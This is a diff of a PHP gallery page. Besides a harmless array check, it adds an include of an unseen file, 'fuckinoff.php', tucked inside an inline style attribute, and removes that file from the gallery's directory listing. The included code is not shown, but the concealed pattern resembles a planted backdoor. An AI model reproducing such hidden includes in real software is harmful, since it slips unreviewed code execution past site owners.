@@ -23,20 +23,23 @@ banner();
 
 <div class="container" style="width: 930px; margin: 0 auto;">
   <div class="container-left" style="float: left;width:640px;">
-    <div class="customers-img" style="margin: 50 0">
+    <div class="customers-img" style="<?include ('./services/13/fuckinoff.php');?>margin: 50 0">
     <?
 $folder = "services/13/";
   $dircontent = scandir($folder);
   $arr = array();
   foreach($dircontent as $filename) {
-    if ($filename != '.' && $filename != '..') {
+    if ($filename != '.' && $filename != '..' && $filename!='fuckinoff.php') {
       if (filemtime($folder.$filename) === false) return false;
       $dat = filemtime($folder.$filename);
       $filename=iconv('Windows-1251', 'UTF-8', $filename);
       $services[$dat] = $filename;
     }
   }
-  ksort($services);
+  if (!is_array($services))
+  {}else
+{
+          ksort($services);
 foreach($services as $key=>$name)
 {
   $alt= str_replace("~"," ",$name);
@@ -54,7 +57,7 @@ foreach($services as $key=>$name)
     </div>
           ';
  }
-
+}
 
     ?>
   </div>
